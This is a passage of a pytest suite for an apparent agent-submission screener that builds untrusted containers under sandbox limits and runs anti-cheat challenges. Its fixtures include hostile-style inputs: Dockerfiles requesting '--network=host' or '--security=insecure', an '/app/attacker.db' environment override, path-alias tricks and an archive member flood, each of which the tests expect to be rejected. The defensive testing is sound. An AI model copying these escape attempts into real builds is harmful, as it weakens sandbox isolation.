        self._events.append("review_started")
        try:
            if self._gate_event is not None:
                await self._gate_event.wait()
        except asyncio.CancelledError:
            self.cancelled = True
            raise
        self._events.append("review_finished")
        return SourceReviewObservation(
            ok=True,
            risk_level="low",
            finding_digest=None,
            categories=("none",),
        )


def _review_engine() -> PolicyEngine:
    return PolicyEngine(
        PolicyManifest(
            rotation_id="overlap-test",
            module_specs=({"kind": "agentic_source_review"},),
        ),
        (AgenticSourceReviewModule(module_id="luna-source-review"),),
    )


async def test_source_review_starts_only_after_build_and_health(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    """Broken build/runtime work must not consume general review capacity."""
    events: list[str] = []

    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            events.append("build_finished")
            _write_iidfile(args)
        if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 0, "sha256:" + "34" * 32
        return 0, ""

    tarball = _valid_tar()
    gate = _gate_with(make_config(), run, tarball=tarball)
    gate._policy = _review_engine()
    gate._source_reviewer = _StubReviewer(events)  # type: ignore[assignment]
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.PASS
    assert events.index("build_finished") < events.index("review_started")
    assert events[-1] == "review_finished"


async def test_source_review_is_not_started_when_the_build_fails(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    events: list[str] = []
    reviewer = _StubReviewer(events)

    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            return 1, "error[E0308]: mismatched types"
        return 0, ""

    tarball = _valid_tar()
    gate = _gate_with(make_config(), run, tarball=tarball)
    gate._policy = _review_engine()
    gate._source_reviewer = reviewer  # type: ignore[assignment]
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert events == []
    assert reviewer.cancelled is False


async def test_progress_callback_failure_does_not_change_screening(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    gate = _gate_with(make_config(), _ok_run(), tarball=tarball)

    def fail_progress(_stage: str) -> None:
        raise RuntimeError("telemetry unavailable")

    async with gate._client:
        result = await _screen(
            gate,
            hashlib.sha256(tarball).hexdigest(),
            progress=fail_progress,
        )
    assert result.outcome == ScreeningOutcome.PASS


def test_format_stage_timings_folds_transitions() -> None:
    history = [
        ("downloading", 0.0),
        ("validating", 1.0),
        ("building", 1.5),
        ("source_review_0", 211.5),
        ("source_review_50", 261.5),
        ("source_review_100", 311.5),
        ("validating", 351.5),
    ]
    formatted = _format_stage_timings(history, end=352.0)
    assert formatted == (
        "downloading_ms=1000 validating_ms=1000 building_ms=210000 "
        "source_review_ms=140000"
    )
    assert _format_stage_timings([], end=1.0) == ""


async def test_screen_logs_one_stage_timing_line(
    make_config: Callable[..., ScreenerConfig],
    caplog: pytest.LogCaptureFixture,
) -> None:
    tarball = _valid_tar()
    gate = _gate_with(make_config(), _ok_run(), tarball=tarball)
    with caplog.at_level(logging.INFO, logger="ditto_screener.gate"):
        async with gate._client:
            result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.PASS
    timing_lines = [
        record.getMessage()
        for record in caplog.records
        if record.getMessage().startswith("screen timing agent_id=")
    ]
    assert len(timing_lines) == 1
    (line,) = timing_lines
    for key in ("total_ms=", "teardown_ms=", "building_ms=", "health_check_ms="):
        assert key in line, line


async def test_fake_gateway_is_internal_and_resource_capped(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []
    config = make_config(
        smoke_env=(
            ("OPENROUTER_API_KEY", "dummy"),
            ("DITTOBENCH_DB", "/app/attacker.db"),
        )
    )
    gate = _gate_with(config, _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.passed
    networks = [call for call in calls if call[:2] == ["network", "create"]]
    assert len(networks) == 1
    runtime_network = networks[0]
    assert runtime_network[-1].startswith("ditto-screen-")
    assert "--internal" in runtime_network
    build = next(call for call in calls if call[0] == "build")
    assert "--load" in build
    assert build[build.index("--network") + 1] == "default"
    assert {"--memory", "8g", "--memory-swap", "--cpu-quota", "--shm-size"} <= set(
        build
    )
    gateway = next(
        call
        for call in calls
        if call[0] == "run" and "DITTO_FAKE_GATEWAY_RESPONSE=" in " ".join(call)
    )
    assert {"--read-only", "--cap-drop", "no-new-privileges"} <= set(gateway)
    assert {"max-size=2m", "max-file=1", "compress=false"} <= set(gateway)
    harness = next(
        call for call in calls if call[0] == "run" and call[-1] == "sha256:" + "34" * 32
    )
    assert "CHUTES_BASE_URL=http://host.docker.internal:11435/v1" in harness
    assert "OPENAI_BASE_URL=http://host.docker.internal:11435/v1" in harness
    assert "OLLAMA_BASE_URL=http://host.docker.internal:11434" in harness
    assert "fake-gateway" not in " ".join(harness)
    assert {"--memory", "3g", "--pids-limit", "512"} <= set(harness)
    assert {"--init", "--user", "65532:65532", "--read-only"} <= set(harness)
    assert {"--ipc", "none", "--log-driver", "local"} <= set(harness)
    assert {"max-size=8m", "max-file=1", "compress=false"} <= set(harness)
    assert {"--tmpfs", "/tmp:rw,noexec,nosuid,nodev,size=512m"} <= set(harness)
    assert {"--cpus", "2", "--ulimit", "nofile=1024:1024"} <= set(harness)
    assert {"--cap-drop", "ALL", "--security-opt", "no-new-privileges"} <= set(harness)
    assert harness.count("DITTOBENCH_DB=/tmp/dittobench.db") == 1
    assert "DITTOBENCH_DB=/app/attacker.db" not in harness


async def test_unloaded_buildx_result_is_retryable_infrastructure(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []

    async def unloaded(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        calls.append(args)
        if args[0] == "build" and stdin is not None:
            stdin.read()
            _write_iidfile(args)
            return 0, "build completed"
        if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 1, "Error response from daemon: No such image"
        return 0, ""

    gate = _gate_with(make_config(), unloaded, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    build = next(call for call in calls if call[0] == "build")
    assert "--load" in build
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert result.evidence[-1].code == "docker-build-infrastructure"
    assert "No such image" in result.detail


async def test_build_uses_daemon_image_id_resolved_from_unique_tag(
    make_config: Callable[..., ScreenerConfig],
    tmp_path: Path,
) -> None:
    tarball = _valid_tar()
    tar_path = tmp_path / "agent.tar.gz"
    tar_path.write_bytes(tarball)
    calls: list[list[str]] = []
    build_result_id = "sha256:" + "12" * 32
    daemon_image_id = "sha256:" + "34" * 32

    async def run(args: list[str], *, stdin: Any = None, **_: Any) -> tuple[int, str]:
        calls.append(args)
        if args[0] == "build" and stdin is not None:
            stdin.read()
            Path(args[args.index("--iidfile") + 1]).write_text(build_result_id)
            return 0, "build completed"
        if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            assert args[-1].startswith(f"ditto-screen/{_AGENT}-")
            return 0, daemon_image_id
        if args[:3] == ["image", "inspect", "--format"]:
            assert args[-1] == daemon_image_id
            return 0, ""
        return 0, ""

    gate = _gate_with(make_config(), run, tarball=tarball)
    ok, detail, image_id = await gate._build(
        tar_path=str(tar_path),
        tag=f"ditto-screen/{_AGENT}-{_ATTEMPT}:latest",
    )

    assert ok
    assert detail == ""
    assert image_id == daemon_image_id


async def test_sha_mismatch_is_deterministic_and_cleans_temp_file(
    make_config: Callable[..., ScreenerConfig],
    monkeypatch: Any,
    tmp_path: Path,
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []
    artifact_path = tmp_path / "failed-download.tar.gz"

    def mkstemp(*_: Any, **__: Any) -> tuple[int, str]:
        fd = os.open(artifact_path, os.O_CREAT | os.O_TRUNC | os.O_RDWR, 0o600)
        return fd, str(artifact_path)

    monkeypatch.setattr(tempfile, "mkstemp", mkstemp)
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(gate, "00" * 32)
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert "sha256 mismatch" in result.detail
    assert not any(call[0] == "build" for call in calls)
    assert not artifact_path.exists()


async def test_container_contract_failure_is_terminal_reject(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _make_tar({"solver.py": b"pass\n"})
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert result.detail.startswith(
        "error[SCR-CONTRACT-001]: Dockerfile is missing from the archive root"
    )
    assert "help:" in result.detail
    assert not any(call[0] == "build" for call in calls)


@pytest.mark.parametrize("entitlement", ["--network=host", "--security=insecure"])
async def test_container_contract_rejects_insecure_build_entitlements(
    make_config: Callable[..., ScreenerConfig], entitlement: str
) -> None:
    tarball = _make_tar(
        {
            "Dockerfile": (
                f'FROM alpine\nRUN {entitlement} echo unsafe\nCMD ["/bin/sh"]\n'
            ).encode(),
            "app.sh": b"#!/bin/sh\n",
        }
    )
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert "SCR-CONTRACT-004" in result.detail
    assert not any(call[0] == "build" for call in calls)


async def test_rootless_executor_policy_fails_closed_before_download(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []

    async def rootful(args: list[str], **_: Any) -> tuple[int, str]:
        calls.append(args)
        if args[0] == "info":
            return 0, '["name=seccomp,profile=builtin","name=cgroupns"]'
        return 0, ""

    gate = _gate_with(
        make_config(require_rootless_docker=True), rootful, tarball=tarball
    )
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert result.evidence[-1].code == "executor-isolation-unavailable"
    assert calls[0] == ["info", "--format", "{{json .SecurityOptions}}"]
    assert not any(call[0] in {"build", "run"} for call in calls)
    assert not any(call[:2] == ["network", "create"] for call in calls)


async def test_rootless_executor_policy_allows_build_and_caches_probe(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []
    run = _ok_run(calls)

    async def rootless(args: list[str], **kwargs: Any) -> tuple[int, str]:
        if args[0] == "info":
            calls.append(args)
            return 0, '["name=seccomp,profile=builtin","name=rootless"]'
        return await run(args, **kwargs)

    gate = _gate_with(
        make_config(require_rootless_docker=True), rootless, tarball=tarball
    )
    async with gate._client:
        first = await _screen(gate, hashlib.sha256(tarball).hexdigest())
        second = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert first.passed and second.passed
    assert sum(call[0] == "info" for call in calls) == 1


@pytest.mark.parametrize(
    "files",
    [
        {
            "Dockerfile": (
                b"FROM python:3.12-alpine\nCOPY app.py /app.py\n"
                b'CMD ["python","/app.py"]\n'
            ),
            "app.py": b"print('python harness')\n",
            "requirements.txt": b"\n",
        },
        {
            "Dockerfile": (
                b'FROM node:22-alpine\nCOPY . /app\nCMD ["node","/app/server.js"]\n'
            ),
            "package.json": b'{"scripts":{"start":"node server.js"}}\n',
            "server.ts": b"console.log('typescript harness')\n",
            "server.js": b"console.log('javascript runtime')\n",
        },
        {
            "Dockerfile": (
                b"FROM golang:1.24-alpine\nCOPY . /src\n"
                b"RUN cd /src && go build -o /agent .\n"
                b'CMD ["/agent"]\n'
            ),
            "go.mod": b"module example/harness\n\ngo 1.24\n",
            "main.go": b"package main\nfunc main() {}\n",
        },
        {
            "Dockerfile": (
                b"FROM rust:1.88-alpine\nCOPY . /src\n"
                b"RUN cd /src && cargo build --release\n"
                b'CMD ["/src/target/release/agent"]\n'
            ),
            "Cargo.toml": b'[package]\nname="agent"\nversion="0.1.0"\n',
            "src/main.rs": b"fn main() {}\n",
        },
        {
            "Dockerfile": (
                b"FROM eclipse-temurin:21-jre\nCOPY agent.jar /agent.jar\n"
                b'CMD ["java","-jar","/agent.jar"]\n'
            ),
            "agent.jar": b"opaque fixture",
        },
    ],
    ids=["python", "typescript", "go", "rust", "other-language"],
)
async def test_container_contract_is_language_neutral(
    make_config: Callable[..., ScreenerConfig], files: dict[str, bytes]
) -> None:
    tarball = _make_tar(files)
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.PASS
    build = next(call for call in calls if call[0] == "build")
    assert build[build.index("--memory") + 1] == "8g"
    assert build[build.index("--memory-swap") + 1] == "8g"


@pytest.mark.parametrize("alias", ["src/./main.rs", "src//main.rs"])
async def test_container_contract_rejects_noncanonical_member_alias(
    make_config: Callable[..., ScreenerConfig], alias: str
) -> None:
    tarball = _valid_tar(**{alias: b"fn replacement() {}\n"})
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert "non-canonical path" in result.detail
    assert not any(call[0] == "build" for call in calls)


async def test_container_contract_rejects_member_flood_before_build(
    make_config: Callable[..., ScreenerConfig], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("ditto_screener.gate._MAX_ARCHIVE_MEMBERS", 3)
    monkeypatch.setattr(
        tarfile.TarFile,
        "getmembers",
        lambda _self: pytest.fail("member cap must stream archive headers"),
    )
    tarball = _valid_tar(**{"empty-directory": b""})
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)

    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())

    assert _MAX_ARCHIVE_MEMBERS == 20_000
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert "too many members" in result.detail
    assert not any(call[0] == "build" for call in calls)


async def test_prebuilt_binary_entrypoint_is_advisory_quarantine(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    """The provenance heuristic reviews, never rejects.

    Text matching cannot prove the image skips the crate build (a wrapper
    build script is legitimate; ``RUN echo cargo`` is not a build), so the
    prebuilt-looking Dockerfile still builds and health-checks, then routes
    to operator-reviewed quarantine with the advisory evidence attached.
    """
    tarball = _valid_tar(
        Dockerfile=(
            b"FROM debian:bookworm-slim\n"
            b"COPY agent /usr/local/bin/agent\n"
            b'ENTRYPOINT ["/usr/local/bin/agent"]\n'
        )
    )
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.QUARANTINE
    assert not result.submits_verdict
    assert any(
        item.code == "image-binding-heuristic" and item.module_id == "stable-core"
        for item in result.evidence
    )
    assert any(call[0] == "build" for call in calls)


async def test_build_only_skips_image_binding_advisory_and_passes(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    """The same prebuilt-entrypoint artifact that routes a FULL screen to an
    advisory QUARANTINE must PASS on a build-only pass. The image-binding
    advisory can only escalate to QUARANTINE, which the worker rejects for a
    build_only item — keeping it would fail submission and loop with no verdict.
    The submission's anti-cheat review is already adjudicated; build-only just
    (re)builds the image.
    """
    tarball = _valid_tar(
        Dockerfile=(
            b"FROM debian:bookworm-slim\n"
            b"COPY agent /usr/local/bin/agent\n"
            b'ENTRYPOINT ["/usr/local/bin/agent"]\n'
        )
    )
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    async with gate._client:
        result = await _screen(
            gate, hashlib.sha256(tarball).hexdigest(), build_only=True
        )
    assert result.outcome == ScreeningOutcome.PASS
    assert result.submits_verdict
    # It still builds the image (that is the whole point of a build-only pass).
    assert any(call[0] == "build" for call in calls)


async def test_build_and_health_failures_are_deterministic(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()

    async def build_failure(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            return 1, "error[E0432]: unresolved import"
        return 0, ""

    gate = _gate_with(make_config(), build_failure, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert "unresolved import" in result.detail

    async def unhealthy(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        if args[0] == "build" and stdin is not None:
            stdin.read()
            _write_iidfile(args)
        if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 0, "sha256:" + "34" * 32
        if args[0] == "exec" and any("http://harness:" in arg for arg in args):
            return 1, "HTTP 503"
        return 0, ""

    gate = _gate_with(make_config(run_timeout_seconds=0.05), unhealthy, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert "never healthy" in result.detail


async def test_image_declared_volume_is_rejected_before_runtime(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []

    async def declared_volume(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        calls.append(args)
        if args[0] == "build" and stdin is not None:
            stdin.read()
            _write_iidfile(args)
        if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 0, "sha256:" + "34" * 32
        if args[:3] == ["image", "inspect", "--format"]:
            return 0, "declared"
        return 0, ""

    gate = _gate_with(make_config(), declared_volume, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
    assert "declares writable volumes" in result.detail
    assert not any(call[0] == "run" for call in calls)


async def test_expired_lease_budget_short_circuits_before_download(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()
    calls: list[list[str]] = []
    gate = _gate_with(make_config(), _ok_run(calls), tarball=tarball)
    loop = asyncio.get_running_loop()
    async with gate._client:
        # A deadline already in the past: the gate must abandon the screen as
        # retryable-infra without building (no docker calls at all).
        result = await gate.screen(
            agent_id=_AGENT,
            attempt_id=_ATTEMPT,
            miner_hotkey=_MINER,
            sha256=hashlib.sha256(tarball).hexdigest(),
            download_url=_URL,
            deadline=loop.time() - 1.0,
        )
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert "lease budget exhausted" in result.detail
    assert not any(args and args[0] == "build" for args in calls)


async def test_gateway_start_failure_is_retryable_infrastructure(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()

    async def no_daemon(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        if args[0] == "build" and stdin is not None:
            stdin.read()
            _write_iidfile(args)
        if args[:4] == ["image", "inspect", "--format", "{{.Id}}"]:
            return 0, "sha256:" + "34" * 32
        if args[:2] == ["network", "create"]:
            return 1, "Cannot connect to the Docker daemon"
        return 0, ""

    gate = _gate_with(make_config(), no_daemon, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert result.detail.startswith("screener error:")


async def test_docker_daemon_build_failure_is_retryable_infrastructure(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()

    async def no_daemon(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            return 1, "Cannot connect to the Docker daemon"
        return 0, ""

    gate = _gate_with(make_config(), no_daemon, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert result.detail.startswith("screener error:")


@pytest.mark.parametrize(
    "failure",
    [
        "no space left on device",
        "failed to solve: failed to mount buildkit snapshot",
        "TLS handshake timeout fetching registry layer",
        "secret gh_token: not found",
        "process was killed: out of memory",
        "process didn't exit successfully: rustc (signal: 9, SIGKILL: kill)",
        "executor failed running [/bin/sh -c build]: exit code: 137",
        "container state: OOMKilled=true",
        # Build aborted by a deploy / `systemctl restart docker` under the
        # worker: BuildKit reports a cancellation, which must requeue, not
        # terminally reject the miner's crate.
        "ERROR: failed to build: failed to solve: Canceled: context canceled",
    ],
)
async def test_transient_build_failures_are_retryable_infrastructure(
    make_config: Callable[..., ScreenerConfig], failure: str
) -> None:
    tarball = _valid_tar()

    async def transient_failure(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            return 1, failure
        return 0, ""

    gate = _gate_with(make_config(), transient_failure, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert result.detail.startswith("screener error:")


async def test_signal_interrupted_build_is_retryable_infrastructure(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    tarball = _valid_tar()

    async def interrupted(
        args: list[str], *, stdin: Any = None, **_: Any
    ) -> tuple[int, str]:
        if args[0] == "build":
            if stdin is not None:
                stdin.read()
            return -15, ""
        return 0, ""

    gate = _gate_with(make_config(), interrupted, tarball=tarball)
    async with gate._client:
        result = await _screen(gate, hashlib.sha256(tarball).hexdigest())
    assert result.outcome == ScreeningOutcome.RETRYABLE_INFRA
    assert "SIGTERM" in result.detail


async def test_failure_diagnostics_are_bounded(
    make_config: Callable[..., ScreenerConfig],
) -> None:
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())

    async def logs(args: list[str], **_: Any) -> tuple[int, str]:
        if args == ["logs", "harness"]:
            return 0, "harness error body"
        if args == ["logs", "gateway"]:
            return 0, "gateway request log"
        return 0, ""

    gate._run = logs  # type: ignore[method-assign]
    detail = await gate._with_container_logs(
        "health failed",
        harness_container="harness",
        gateway_container="gateway",
    )
    await gate._client.aclose()
    assert "harness error body" in detail
    assert "gateway request log" in detail


async def test_private_challenge_observes_isolated_gateway_dataflow(
    make_config: Callable[..., ScreenerConfig], tmp_path: Path
) -> None:
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
    state = tmp_path / "gateway-calls"
    token = "ephemeral-audit-output"

    async def request(*_: Any, **__: Any) -> tuple[int, str]:
        state.write_text("1\n")
        return 0, '{"final_text":"prefix ephemeral-audit-output suffix"}'

    gate._request_from_sidecar = request  # type: ignore[method-assign]
    observation = await gate._run_private_challenge(
        "rotating-control",
        {"case_id": "private-control"},
        5,
        harness_base="http://harness:8080",
        probe_container="probe",
        gateway_response_token=token,
        gateway_state_file=str(state),
    )
    await gate._client.aclose()

    assert observation.ok
    assert observation.gateway_calls == 1
    assert observation.gateway_token_observed
    assert observation.json_keys == ("final_text",)


async def test_private_challenge_scores_the_gateway_encoded_oracle(
    make_config: Callable[..., ScreenerConfig], tmp_path: Path
) -> None:
    """A harness that surfaces the second-turn answer clears the objective oracle."""
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
    state = tmp_path / "gateway-calls"

    async def two_turn(*_: Any, **__: Any) -> tuple[int, str]:
        state.write_text("1\n1\n")  # two observed gateway round-trips
        return 0, '{"final_text":"the model returned oracle-answer-token"}'

    gate._request_from_sidecar = two_turn  # type: ignore[method-assign]
    observation = await gate._run_private_challenge(
        "v8-behavioral-oracle",
        {"protocol": "gateway_round_trip"},
        5,
        harness_base="http://harness:8080",
        probe_container="probe",
        gateway_response_token="nonce-token",
        oracle_answer="oracle-answer-token",
        gateway_state_file=str(state),
    )
    await gate._client.aclose()

    assert observation.ok
    assert observation.gateway_calls == 2
    assert observation.oracle_answer_correct


async def test_private_challenge_flags_wrong_oracle_answer(
    make_config: Callable[..., ScreenerConfig], tmp_path: Path
) -> None:
    """A table that never makes the round-trip cannot surface the answer token."""
    gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
    state = tmp_path / "gateway-calls"

    async def table(*_: Any, **__: Any) -> tuple[int, str]:
        return 0, '{"final_text":"static precomputed answer"}'

    gate._request_from_sidecar = table  # type: ignore[method-assign]
    observation = await gate._run_private_challenge(
        "v8-behavioral-oracle",
        {"protocol": "gateway_round_trip"},
        5,
        harness_base="http://harness:8080",
        probe_container="probe",
        gateway_response_token="nonce-token",
        oracle_answer="oracle-answer-token",
        gateway_state_file=str(state),
    )
    await gate._client.aclose()

    assert observation.ok
    assert observation.gateway_calls == 0
    assert not observation.oracle_answer_correct


def test_with_tool_endpoint_fills_only_tool_declaring_requests() -> None:
    from ditto_screener.gate import _TOOL_ENDPOINT, _with_tool_endpoint

    # Tool-declaring request with no endpoint: gets the reachable gateway sink.
    filled = _with_tool_endpoint({"case_id": "c", "tools": [{"name": "search_web"}]})
    assert filled["tool_endpoint"] == _TOOL_ENDPOINT

    # No tools: unchanged (no endpoint injected).
    assert "tool_endpoint" not in _with_tool_endpoint({"case_id": "c"})

    # Explicit endpoint is preserved, not overwritten.
    kept = _with_tool_endpoint(
        {
            "case_id": "c",
            "tools": [{"name": "x"}],
            "tool_endpoint": "http://elsewhere/tool",
        }
    )
    assert kept["tool_endpoint"] == "http://elsewhere/tool"

    # The input mapping is copied, never mutated.
    original = {"case_id": "c", "tools": [{"name": "x"}]}
    _with_tool_endpoint(original)
    assert "tool_endpoint" not in original
